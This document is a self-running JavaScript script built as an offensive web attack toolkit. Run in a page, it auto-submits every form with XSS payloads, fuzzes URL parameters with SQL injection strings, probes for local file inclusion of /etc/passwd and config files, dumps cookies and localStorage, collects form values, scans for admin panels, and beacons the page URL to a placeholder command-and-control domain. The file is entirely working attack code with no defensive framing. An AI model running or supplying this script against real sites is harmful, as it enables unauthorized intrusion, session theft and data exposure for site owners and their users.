(function() {
  const log = (msg) => {
    const el = document.getElementById('console');
    if (el) el.textContent += `\n${msg}`;
    console.log(msg);
  };

  // 1. DOM Crawler
  const crawl = () => {
    const links = [...document.querySelectorAll('a')].map(a => a.href);
    log(`[+] Crawled ${links.length} links`);
  };

  // 2. XSS Injector
  const xss_payloads = [`"><img src=x onerror=alert(1)>`, `'><svg/onload=alert(1)>`];
  const xss_inject = () => {
    const forms = document.forms;
    for (let form of forms) {
      for (let p of xss_payloads) {
        for (let i = 0; i < form.elements.length; i++) {
          form.elements[i].value = p;
        }
        form.submit();
        log(`[+] Injected payload: ${p}`);
      }
    }
  };

  // 3. SQLi Fuzzer
  const sqli_payloads = [`' OR '1'='1`, `" OR 1=1--`, `' UNION SELECT null--`];
  const sqli_fuzz = () => {
    const params = location.search.slice(1).split("&");
    for (let p of sqli_payloads) {
      for (let param of params) {
        let test = location.pathname + "?" + param.split("=")[0] + "=" + encodeURIComponent(p);
        log(`[?] Fuzzing: ${test}`);
        fetch(test).then(res => {
          if (res.status === 200) log(`[+] Response OK for ${p}`);
        });
      }
    }
  };

  // 4. LFI Check
  const lfi_paths = [`../../../../etc/passwd`, `../../../../boot.ini`, `../../../../../app/config.php`];
  const lfi_test = () => {
    for (let path of lfi_paths) {
      let test = `${location.origin}${location.pathname}?file=${encodeURIComponent(path)}`;
      fetch(test).then(r => r.text()).then(t => {
        if (t.includes("root:x") || t.includes("[boot loader]") || t.includes("<?php")) {
          log(`[!!!] LFI Found: ${test}`);
        }
      });
    }
  };

  // 5. Cookie/Storage Dumper
  const dump_secrets = () => {
    log(`[🍪] Cookies: ${document.cookie}`);
    log(`[📦] localStorage: ${JSON.stringify(localStorage)}`);
  };

  // 6. Form Stealer
  const form_stealer = () => {
    const data = [];
    for (let form of document.forms) {
      let entry = {};
      for (let elem of form.elements) {
        if (elem.name) entry[elem.name] = elem.value;
      }
      data.push(entry);
    }
    log(`[📥] Form Data: ${JSON.stringify(data)}`);
  };

  // 7. Admin Panel Finder
  const admin_paths = [`/admin`, `/administrator`, `/admin/login`, `/panel`, `/cpanel`];
  const find_admin = () => {
    for (let path of admin_paths) {
      fetch(path).then(r => {
        if (r.status === 200) log(`[+] Admin page found: ${path}`);
      });
    }
  };

  // 8. Beacon to C2 (optional tracking/logging)
  const beacon = () => {
    fetch('https://yourc2domain.com/beacon?target=' + encodeURIComponent(location.href));
    log(`[📡] C2 Beacon sent`);
  };

  // 🔥 Run Everything
  crawl();
  xss_inject();
  sqli_fuzz();
  lfi_test();
  dump_secrets();
  form_stealer();
  find_admin();
  beacon();

})();
